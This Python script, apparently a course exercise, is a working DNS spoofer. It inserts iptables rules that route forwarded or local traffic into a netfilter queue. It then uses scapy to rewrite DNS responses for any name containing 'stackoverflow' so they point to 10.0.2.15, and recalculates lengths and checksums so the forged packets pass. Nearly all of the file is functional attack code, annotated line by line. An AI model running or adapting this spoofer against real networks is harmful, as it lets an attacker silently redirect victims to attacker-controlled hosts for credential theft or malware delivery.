#import libraries and modules
import subprocess
import optparse
import scapy.all as scapy

try:
    import netfilterqueue
except:
    subprocess.call(["pip3","install", "-U", "git+https://github.com/kti/python-netfilterqueue"])
    import netfilterqueue

#runs bash-command: 'iptables _i FORWARD -j NFQUEUE --queue-num 666'
#FORWARD: is the default queue to which packets, being routed through own machine, are passed
    #alternative: INPUT OUTPUT: is the default queue to which pachets leaving own computer / or coming in to own computer are passed
#NFQUEUE: allows to put packet in any queue specified by the queue-number - here: this one is created and now packets from FORWARD will be saved here
#queue-num: is the queue number for the newly created NFQUEUE - this number can be chosen at random from 0 - 65535
# -I: a command, that inserts one or more rules in the selected chain
# -j: specifies the target of the rule (-here: the rule inserted using '-I')
def get_args():
    '''
    Get command line arguments
    '''

    parser = optparse.OptionParser()
    parser.add_option("-o", "--packet-origin", dest="packet_origin", default="remote",help="Origin of packets: can be 'own' or 'remote'")

    (options, _) = parser.parse_args()

    if (options.packet_origin != "own") and (options.packet_origin != "remote"):
        parser.error("[-] Specify the origin of the packets using '-o <own/remote>' or use '--help' for more info")
        quit()
    else:
        return options.packet_origin

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) #draping the original packet into a scapy-IP-layer wil automatically convert it into a scapy packet
    if scapy_packet.haslayer(scapy.DNSRR): #RR - response; RQ - request
        qname = scapy_packet[scapy.DNSQR].qname.decode() # get name of targeted website from DNS REQUEST [=scapy.DNSRQ]; form <scapy.packet>[<layer_name>].<field_name>
        if "stackoverflow" in qname:
            print("[+] Targeting the victim...\n") #print payload contained in packet
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15") # creates a pDNS response qith qname of target, but IP address customly selected by 'rdata'; NOTE: scpay will fill in all other field by itself - rrname and rdata are the only 2 fields that scapy can NOT determine by itself
            scapy_packet[scapy.DNS].an = answer #replace DNS response in scpay_packet; [scapy.DNSRR] and [scapy.DNS].an both point to the DNA Response part of the packet
            scapy_packet[scapy.DNS].ancount = 1 # modify count of answers sent from x to 1 (becasue we just add 1 to the modified packet

            #delete length and checksxum information (fields) in 'scpay_package', so that it does not corrupt the modified package
            # --> scapy will automatically recalculate these fields and fill them in, based on the odifications
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet)) # change original packet to modified scapy packet string
            print(packet)
    else:
        print("Not a DNS response packet.")
    packet.accept() #forwards packet to its destination; using 'packet.drop()' will drop the packet and cut the internet connection of the client


print("===================")
print("Starting DNS spoofer")
print("===================")

packet_origin = get_args()

if packet_origin == "remote":
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "666"])
elif packet_origin == "own":
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "666"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "666"])

try:
    queue = netfilterqueue.NetfilterQueue() # object that is going to interact with queue 666 created above
    queue.bind(666, process_packet) # binds variable 'queue' to 666 and executes a function on every packet in the queue
    queue.run()
except KeyboardInterrupt:
    print("Shutting down program...")
    print("Flushing IP Tables...")
    subprocess.run(["iptables","--flush"])
    print("IP Tables successfully reset.")
    exit()

